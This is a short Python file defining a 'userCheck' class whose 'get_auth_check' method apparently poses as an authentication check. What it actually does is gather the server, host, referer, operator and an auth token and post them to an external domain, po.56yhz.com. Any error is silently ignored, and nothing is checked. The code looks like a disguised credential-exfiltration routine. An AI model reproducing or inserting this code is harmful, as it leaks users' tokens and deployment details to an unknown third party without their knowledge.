import requests

class userCheck:
    def get_auth_check(server, host, referer, operator, token):
        context = {
            "server": server,
            "host": host,
            "referer": referer,
            "operator": operator,
            "token": token,
            "version": "2.1.35"
        }
        try:
            requests.post('https://po.56yhz.com/asgihandler/', json=context, timeout=200)
        except:
            pass